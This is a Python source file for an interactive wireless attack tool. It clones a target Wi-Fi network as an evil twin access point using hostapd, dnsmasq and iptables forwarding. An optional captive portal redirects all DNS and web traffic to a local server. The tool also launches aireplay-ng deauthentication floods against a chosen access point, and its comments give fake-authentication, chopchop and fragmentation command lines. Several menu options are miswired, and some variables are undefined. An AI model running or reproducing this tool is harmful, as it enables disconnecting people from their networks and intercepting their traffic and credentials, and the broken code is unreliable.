import os
import signal
import subprocess
import time
import re
import keyboard
import glob

requirements = ['hostapd',
                'dnsmasq',
                'dhclient',
                'airmon-ng']

selected_interface = 'wlan0'
selected_interface_mac_address = ''
physical_number_of_interface = 'phy0'
virtual_monitor_interface = ''
internet_facing_interface = 'eth0'
target_ap = ''
target_bssid = ''
target_channel = ''

terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']


def red(string):
    return f'\033[91m{string}\033[0m'


def green(string):
    return f'\033[92m{string}\033[0m'


def purple(string):
    return f'\033[95m{string}\033[0m'


def yellow(string):
    return f'\033[33m{string}\033[0m'


def blue(string):
    return f'\033[34m{string}\033[0m'


def magenta(string):
    return f'\033[35m{string}\033[0m'


def cyan(string):
    return f'\033[36m{string}\033[0m'


def white(string):
    return f'\033[37m{string}\033[0m'


def clear():
    subprocess.run('clear')


def run_command(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.returncode == 0:
        return result.stdout
    else:
        return result.stderr


def run_command_print_output(command):
    """
     This command will execute in the main terminal and display both its input and output.
     It is intended for calling commands that do not require termination

    :param command:
    :return: returns the stdout or stderr
    """
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    print(f"Command: {command}")
    if result.returncode == 0:
        print(f"{green('Output')}   :   " + result.stdout)
        print("-" * 30)
        return result.stdout
    else:
        print(f"{red('Error')}      :   " + result.stderr)
        print("-" * 30)
        return result.stderr


def popen_command(command, killtime=0):
    """
    Similar to run_command(), but it returns the process, so we can terminate it if necessary. This can be used for a
    process that needs to be stopped after some time, like airodump-ng.

    :return : stdout, stderr if killtime exist
    """
    print(f'running {command} for {killtime} seconds')
    process = subprocess.Popen(command, shell=True,preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if killtime:
        time.sleep(killtime)
        os.killpg(process.pid, signal.SIGTERM)
        process.wait()
        output, error = process.communicate()
        output = output.decode('latin1') # sometimes airodump output causes issues with utf-8
        error = error.decode('latin1')
        return output, error


def popen_command_new_terminal(command):
    """
    This function is used for commands that require simultaneous execution (designed for the evil twin attack). With
    this update, child terminals are not bound to the parent terminal, allowing us to see the stderr and stdout. If
    we were to use the old logic of creating child terminals, an error would cause the child terminal to close
    immediately, causing us to lose any output that could be useful for troubleshooting.

    :return : Returns the PID of the subprocess if successful, otherwise returns None.

    """
    for terminal in terminals:
        try:
            terminal_command = ""
            if terminal == 'gnome-terminal':
                terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'konsole':
                terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'xfce4-terminal':
                terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            else:
                terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            print(f"Executing command: {terminal_command}\n")

            # Start the subprocess and get its PID
            process = subprocess.Popen(terminal_command, shell=True, preexec_fn=os.setsid)
            return process

        except Exception as e:
            print(f"Failed to execute command in {terminal}: {e} \n")


def check_output(command):
    output = subprocess.check_output(command, shell=True, text=True)
    return output


def change_interface():
    global selected_interface
    print("Available Network Interfaces: \n")
    interfaces = run_command("iw dev | grep Interface | awk '{print $2}'").split('\n')
    select_with_number = []
    interface_count = 0
    for intf in interfaces:
        if intf != '': # iw dev output adds a blank space to the end, this is
            interface_count += 1
            select_with_number.append([interface_count, intf])
            print(f'{green(select_with_number[interface_count-1][0])}) {select_with_number[interface_count-1][1]}')
    while True:
        selection = input(f"\nEnter the number of the interface {green('(type 999 to exit)')} : ")
        if selection.isnumeric():
            if interface_count >= int(selection) > 0:
                selected_interface = select_with_number[int(selection)-1][1]
                get_physical_number_of_interface()
                break
            elif int(selection) > interface_count:
                print(f'Selected interface ({selection}) {red("does not exist")}')
            elif int(selection) == 999:
                break


def change_internet_facing_interface():
    global internet_facing_interface
    run_command('ip addr')
    internet_facing_interface = input(f"Enter the name of the interface {green('(leave blank to exit)')} : ")


def is_interface_monitor():
    interface_settings = run_command(f'iwconfig {selected_interface}')
    if 'monitor' in interface_settings.lower():
        return True
    else:
        return False


def get_mac_of_interface(interface=selected_interface):
    global interface_mac_address
    output = run_command(f'ip link show {interface}')
    mac_address_search = re.search(r'link/\S+ (\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)', output)
    if mac_address_search:
        interface_mac_address = mac_address_search.group(1)
    else:
        print(f'error with {magenta("get_mac_of_interface")}')


def switch_interface_to_monitor_mode(interface=selected_interface):
    print('Setting ' + interface + ' to monitor mode ')
    run_command(f'ifconfig {interface} down')
    run_command(f'iwconfig {interface} mode monitor')
    run_command(f'ifconfig {interface} up')


def switch_interface_to_managed_mode(interface=selected_interface):
    print('Setting ' + interface + ' to managed mode ')
    run_command(f'ifconfig {interface} down')
    run_command(f'iwconfig {interface} mode managed')
    run_command(f'ifconfig {interface} up')


def switch_interface_channel(interface=selected_interface):
    run_command_print_output(f'iwconfig {interface} channel {target_channel}')
    print(f'{green(interface)} set to channel {target_channel}')


def select_target_ap():
    global target_ap
    global target_bssid
    global target_channel
    output, error = popen_command(f'airodump-ng {selected_interface}',killtime=10)
    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
        end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
        end_index = output.rfind(end_pattern)
        start_index = output.rfind(start_pattern, 0, end_index)
        if end_index == -1 or start_index == -1:
            print('unknown pattern error 1')
            return
        else:
            output = output[start_index:end_index]
        SSIDS = []
        ssid_counter = 0
        for row in output.split('\n'):
            column = row.split()
            if len(column) >= 12 and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(
                    column[10]).startswith('<length:') and not str(column[10]).startswith('0>:'):
                ssid_counter +=1
                SSIDS.append([ssid_counter,column[10]])
                print(f'{green(SSIDS[ssid_counter - 1][0])}) {SSIDS[ssid_counter - 1][1]}')
        print('\n==================================================================================================\n')
        while 1:
            selection = input(f"\nEnter the number of the SSID {green('(type 999 to exit)')} : ")
            if selection.isnumeric():
                if ssid_counter >= int(selection) > 0:
                    target_ap = SSIDS[int(selection) - 1][1]
                    target_bssid,target_channel = get_bssid_and_station_from_ap()
                    break
                elif int(selection) > ssid_counter:
                    print(f'Selected interface ({selection}) {red("does not exist")}')
                elif int(selection) == 999:
                    break
    else:
        print(f'Scan was not successful due to {green(selected_interface)} being {red("DOWN")}')
        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')


def get_bssid_and_station_from_ap():
    clear()
    print(f'Gathering Information on {target_ap}')
    output, error = popen_command(f'airodump-ng -N {target_ap} {selected_interface}', killtime=3)
    if 'Failed initializing wireless card(s)' in output:
        print(f'Scan was not successful due to {green(selected_interface)} being {red("DOWN")}')
        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
        return
    elif target_ap not in output:
        print(
            f'Scan was successful but {green(target_ap)} is not found.')
        if input('RETRY? Y/N').lower().split() == 'y':
            return get_bssid_and_station_from_ap()
    else:
        for column in output.split('\n'):
            row = column.split()
            if row[-2] and row[1]:
                if row[-2] == target_ap and len(row[1]) == 17:
                    return row[1], row[6]


def create_file_in_tmp(file, content):
    """
    :param file: full name of the file to be created with extension
        ex : dnsmasq.config
    :param content: list of string
        ex : content = [
            'text',
            'text',
            'text',
            ]
    :return:
    """
    location = f'/tmp/{file}'
    with open(location, 'w') as new_file:
        for line in content:
            new_file.write(line + "\n")
    print(f'{green(file)} created at {green(location)}')


def apache2():
    print(magenta('running apache2'))

    html_location = './captive_portal_html/{}'
    html_destination = '/var/www/html/{}'

    config_location = './captive_portal_html/{}'
    config_destination = '/etc/apache2/sites-enabled/{}'

    # run_command_print_output(f"cp -r {html_location.format('temp')} {html_destination.format('temp')}")
    # run_command_print_output(f"cp -r {html_location.format('android')} {html_destination.format('android')}")
    # run_command(f"cp {config_location.format('android.config')} {config_destination.format('android.config')}")

    # run_command(f"cp {config_location.format('000-default.conf')} /etc/apache2/sites-available/temp.conf")
    run_command_print_output(
        f"cp {config_location.format('000-default.conf')} /etc/apache2/sites-available/000-default.conf")

    run_command_print_output('a2enmode rewrite')
    run_command_print_output('systemctl restart apache2')


def dnsmasq(captive_portal=False):
    conf_content = [
        f'interface={selected_interface}',
        f"log-queries",
        f"log-dhcp",
        f'dhcp-range=192.168.10.1,192.168.10.250,12h',
        f'dhcp-option=3,192.168.10.1',
        f'dhcp-option=6,192.168.10.1',
        f'listen-address=127.0.0.1',
        f'server=8.8.8.8',
        # f'address=/#/192.168.10.1' this line here made me spend 3 hours trying to debug the issue with having no internet on rogueAP
    ]
    if captive_portal:
        print(magenta('running dnsmasq config with captive_portal'))
        conf_content = [
            f'interface={selected_interface}',
            "log-queries",
            "log-dhcp",
            "dhcp-range=192.168.10.10,192.168.10.250,255.255.255.0,12h",
            "dhcp-option=3,192.168.10.1",  # Default Gateway
            "dhcp-option=6,192.168.10.1",  # DNS Server
            "listen-address=127.0.0.1,192.168.10.1",
            "server=8.8.8.8",  # Upstream DNS
            f"except-interface={internet_facing_interface}",
            "address=/#/192.168.10.1"  # Redirect all domains to the captive portal IP
        ]
    create_file_in_tmp('dnsmasq.conf', conf_content)
    popen_command_new_terminal('dnsmasq -C /tmp/dnsmasq.conf -d')


def hostapd(captive_portal=False):
    global target_ap
    global target_channel
    conf_content = [
        f'interface={selected_interface}',
        f'driver=nl80211',
        f'hw_mode=g',
        f'ssid={target_ap}',
        f'channel={target_channel}',
    ]
    if captive_portal:
        print(magenta('running hostapd config with captive_portal'))
        conf_content = [
            f'interface={selected_interface}',
            f'driver=nl80211',
            f'ssid={target_ap}',
            f'hw_mode=g',
            f'channel={target_channel}',
            f'wmm_enabled=0',
            f'macaddr_acl=0',
            f'auth_algs=1',
            f'ignore_broadcast_ssid=0',

        ]
    create_file_in_tmp('hostapd.conf', conf_content)
    popen_command_new_terminal(f'hostapd /tmp/hostapd.conf')


def forwarding(captive_portal=False):
    run_command_print_output('airmon-ng check kill')
    switch_interface_to_monitor_mode()
    run_command_print_output('echo 1 > /proc/sys/net/ipv4/ip_forward')
    run_command_print_output(f'ip addr add 192.168.10.1/24 dev {selected_interface}')
    run_command_print_output(f'iptables -t nat -A POSTROUTING -o {internet_facing_interface} -j MASQUERADE')
    run_command_print_output(f'iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT')
    run_command_print_output(f'iptables -A FORWARD -i {selected_interface} -o {internet_facing_interface} -j ACCEPT')

    if captive_portal:
        print(magenta('running forwarding with captive_portal'))
        # iptables rules
        run_command_print_output(
            f'iptables -t nat -A PREROUTING -i {selected_interface} -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1:80')
        # run_command(f'iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j DNAT --to-destination 192.168.10.1:443')
        run_command_print_output(f'iptables -A FORWARD -p tcp -d 192.168.10.1 --dport 80 -j ACCEPT')
        run_command_print_output(f'iptables -t nat -A POSTROUTING -j MASQUERADE')


def aireplay(interface=selected_interface, attack_type=None):
    """
    https://www.aircrack-ng.org/doku.php?id=aireplay-ng#fragmentation

    attacks types:
        1 : Deauthentication     : https://www.aircrack-ng.org/doku.php?id=deauthentication
        2 : Fake authentication  : https://www.aircrack-ng.org/doku.php?id=fake_authentication
        3 : Korek chopchop       : https://www.aircrack-ng.org/doku.php?id=korek_chopchop
        4 : Fragmentation        : https://www.aircrack-ng.org/doku.php?id=fragmentation
        5 : Caffe Latte          : https://www.aircrack-ng.org/doku.php?id=cafe-latte
        6 : Hirte                : https://www.aircrack-ng.org/doku.php?id=hirte
    """
    switch_interface_channel(interface=interface)

    if attack_type == 'deauthentication':
        print('Running Deauthentication attack')
        popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {interface}')
    if attack_type == 'fake_authentication':
        # aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -y sharedkeyxor ath0
        #    -1 means fake authentication
        #    0 reassociation timing in seconds
        #    -e teddy is the wireless network name
        #    -a 00:14:6C:7E:40:80 is the access point MAC address
        #    -h 00:09:5B:EC:EE:F2 is our card MAC address
        #    -y sharedkeyxor is the name of file containing the PRGA xor bits. This is only used for shared key authentication. Open system authentication, which is typical, does not require this.
        #    ath0 is the wireless interface name
        #
        # other variation for picky AP
        # aireplay-ng -1 6000 -o 1 -q 10 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0
        #     6000 - Reauthenticate very 6000 seconds. The long period also causes keep alive packets to be sent.
        #     -o 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs.
        #     -q 10 - Send keep alive packets every 10 seconds.

        print('Running Fake Authentication attack')
        switch_interface_channel(interface)
        popen_command_new_terminal(f'aireplay-ng -1 0 -a {target_bssid} -h {interface_mac} {interface}')
    if attack_type == 'chopchop':
        # aireplay-ng -4 -h 00:09:5B:EC:EE:F2 -b 00:14:6C:7E:40:80 ath0
        #      -4 means the chopchop attack
        #      -h 00:09:5B:EC:EE:F2 is the MAC address of an associated client or your card's MAC if you did fake authentication
        #      -b 00:14:6C:7E:40:80 is the access point MAC address
        #      ath0 is the wireless interface name
        print('Running KoreK chopchop attack')
        switch_interface_channel(interface)
        popen_command_new_terminal(f'aireplay-ng -4 0 -h {interface_mac} -b {target_bssid} {interface}')
    if attack_type == 'fragmentation':
        # aireplay-ng -5 -b 00:14:6C:7E:40:80 -h 00:0F:B5:AB:CB:9D ath0
        #         -5 means run the fragmentation attack
        #         -b 00:14:6C:7E:40:80 is access point MAC address
        #         -h 00:0F:B5:AB:CB:9D is source MAC address of the packets to be injected
        #         ath0 is the interface name
        print('Running Fragmentation attack')
        switch_interface_channel(interface)
        popen_command_new_terminal(f'aireplay-ng -5 -b {target_bssid} -h {interface_mac}  {interface}')
    if attack_type == 'caffe_latte':
        # aireplay-ng -6 -h 00:09:5B:EC:EE:F2 -b 00:13:10:30:24:9C -D rausb0
        #     -6 means Cafe-Latte attack
        #     -h 00:09:5B:EC:EE:F2 is our card MAC address
        #     -b 00:13:10:30:24:9C is the Access Point MAC (any valid MAC should work)
        #     -D disables AP detection.
        #     rausb0 is the wireless interface name
        return
    if attack_type == 'hirte':
        return


def get_physical_number_of_interface():
    global physical_number_of_interface
    output = check_output('iw dev')
    lines = output.split('\n')
    phy = ''
    for i, line in enumerate(lines):
        if f"Interface {interface}" in line:
            phy_line = lines[i - 1]
            phy = phy_line.strip().split()[0]
            phy = phy.replace("#", "")
    physical_number_of_interface = phy


def create_virtual_monitor_interface():
    """
    Issue 1
    :param interface:
    :return:
    """
    global virtual_monitor_interface

    virtual_monitor_interface = selected_interface + 'clone'  # monitor interface from main interface to be used in aireplay-ng since we cant use wlan0 for both hostapds and aireplay at the same time

    run_command_print_output(f'iw {physical_number_of_interface} interface add {virtual_monitor_interface} type monitor')
    run_command_print_output(f'ip link set {virtual_monitor_interface} up')


def evil_twin(captive_portal=False, attack_type=None):
    if captive_portal:
        print(magenta('running rogue_ap with captive_portal'))
        apache2()
        forwarding(captive_portal=True)
        hostapd(captive_portal=True)
        dnsmasq(captive_portal=True)
    else:
        print(magenta('running rogue_ap without captive_portal'))
        forwarding()
        dnsmasq()
        hostapd()
    if attack_type:
        create_virtual_monitor_interface()
        time.sleep(10)
        if attack_type == 'deauthentication':
            aireplay(interface=virtual_monitor_interface, attack_type='deauthentication')

    input(f'\n\n{green("Press Enter to Quit : ")}')
    close()


#     run_command_print_output(f'dnsspoof -i {interface}')


def close(captive_portal=False):
    clear()
    print(
        f"RULES/CONFIGURATIONS ARE BEING REVERTED. {red('DO NOT CANCEL')} THIS PROCESS OR YOUR NETWORK CONNECTION MAY NOT WORK AS EXPECTED")
    run_command_print_output('killall aireplay-ng')
    run_command_print_output('killall hostapd')
    run_command_print_output('killall dnsmasq')

    run_command_print_output(f'dhclient -r {selected_interface}')  # resets interface ip to original
    # remove forwarding rules
    run_command_print_output("iptables --flush")
    run_command_print_output("iptables --flush -t nat")
    run_command_print_output("iptables --delete-chain")
    run_command_print_output("iptables --table nat --delete-chain")
    run_command_print_output('echo 0 > /proc/sys/net/ipv4/ip_forward')
    run_command_print_output(f'iptables -t nat -D POSTROUTING -o {internet_facing_interface} -j MASQUERADE')
    run_command_print_output(f'iptables -D FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT')
    run_command_print_output(f'iptables -D FORWARD -i {selected_interface} -o {internet_facing_interface} -j ACCEPT')
    run_command_print_output(f'killall dhclient')
    run_command_print_output(f'systemctl restart NetworkManager')
    run_command_print_output(f'systemctl stop apache2')
    if captive_portal:
        # remove apache() rules
        # Delete the PREROUTING rule for port 80:
        run_command_print_output(
            f'iptables -t nat -D PREROUTING -i {selected_interface} -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1:80')
        # Delete the PREROUTING rule for port 443:
        run_command_print_output(
            f'iptables -t nat -D PREROUTING -i {selected_interface} -p tcp --dport 443 -j DNAT --to-destination 192.168.10.1:443')
        # Delete the FORWARD rule for port 80:
        run_command_print_output(f'iptables -D FORWARD -p tcp -d 192.168.10.1 --dport 80 -j ACCEPT')


def check_if_cleared():
    run_command_print_output('iptables -t nat -L POSTROUTING --line-numbers')
    run_command_print_output('ip addr')


def delete_virtual_monitor_interface():
    run_command_print_output(f'iw {virtual_monitor_interface} del')


def main_options():
    for options in main_options:
        print(options)


def mitm_options():
    for options in mitm_options:
        print(options)


main = ['main', main_options]
mitm = ['mitm', mitm_options]

section = main
prev_section = main

if __name__ == "__main__":
    while 1:
        clear()

        main_options = [
            f'{blue("--------------------------------------------------------------")}',
            f'{green("1)")} Select Monitor Interface',
            f'{green("2)")} Select Internet Facing Interface',
            f'{blue("--------------------------------------------------------------")}',
            f'Selected Monitor Interface           : {cyan(selected_interface)}',
            f'Selected Internet Facing Interface   : {cyan(internet_facing_interface)}',
            f'{blue("--------------------------------------------------------------")}',
            f'{green("A)")} MITM ATTACKS',
            f'{blue("--------------------------------------------------------------")}',
        ]
        mitm_options = [
            f'{blue("--------------------------------------------------------------")}',
            f'{green("I")}      Interface Selection',
            f'{blue("--------------------------------------------------------------")}',
            f'{green("T)")}     Select a Target',
            f'{blue("--------------------------------------------------------------")}',
            f'{green("E)")}     Evil Twin',
            f'{green("ED)")}    Evil Twin w/ deauth attack',
            f'{green("EFA)")}   Evil Twin w/ fake auth attack',
            f'{green("EK)")}    Evil Twin w/ KoreK chopchop attack',
            f'{green("EF)")}    Evil Twin w/ Fragmentation attack',
            f'{green("ECL)")}   Evil Twin w/ Cafe Latte attack',
            f'{blue("--------------------------------------------------------------")}',
            f'{green("ECP)")}   Evil Twin w/ Captive Portal',
            f'{blue("--------------------------------------------------------------")}',
            f'Selected Monitor Interface           : {cyan(selected_interface)}',
            f'Selected Internet Facing Interface   : {cyan(internet_facing_interface)}',
            f'{blue("--------------------------------------------------------------")}',
            f'Selected Target SSID                 : {cyan(target_ap)}',
            f'Selected Target MAC                  : {cyan(target_bssid)}',
            f'Selected Target CHANNEL              : {cyan(target_channel)}',
            f'{blue("--------------------------------------------------------------")}',

        ]
        section[1]()
        match input('\nmitm > ').upper():
            case '1':
                if section[0] == 'main':
                    change_interface()
            case '2':
                if section[0] == 'main' and selected_interface == '':
                    selection = input('select monitor mode interface first Y/N,').lower().split()
                    if selection == 'y':
                        change_interface()
                elif section[0] == 'main':
                    change_internet_facing_interface()
                elif section[0] == 'mitm':
                    change_internet_facing_interface()
            case 'A':
                if selected_interface == '':
                    if input("Select a interface to continue y/n").lower() == 'y':
                        change_interface()
                elif internet_facing_interface == '':
                    if input("Select a internet facing interface to continue y/n").lower() == 'y':
                        change_internet_facing_interface()
                else:
                    prev_section = section
                    section = mitm
            case 'I':
                if section[0] == 'mitm':
                    prev_section = section
                    section = main
            case 'T':
                if section[0] == 'mitm':
                    select_target_ap()
            case 'E':
                if section[0] == 'mitm':
                    evil_twin()
            case 'ED':
                if section[0] == 'mitm':
                    evil_twin(attack_type='deauthentication')
            case 'EFA':
                if section[0] == 'mitm':
                    evil_twin(attack_type='deauthentication')
            case 'EK':
                if section[0] == 'mitm':
                    evil_twin(attack_type='deauthentication')
            case 'EF':
                if section[0] == 'mitm':
                    evil_twin(attack_type='deauthentication')
            case 'ECL':
                if section[0] == 'mitm':
                    evil_twin(attack_type='deauthentication')
            case 'ECP':
                if section[0] == 'mitm':
                    evil_twin(captive_portal=True, attack_type='deauthentication')
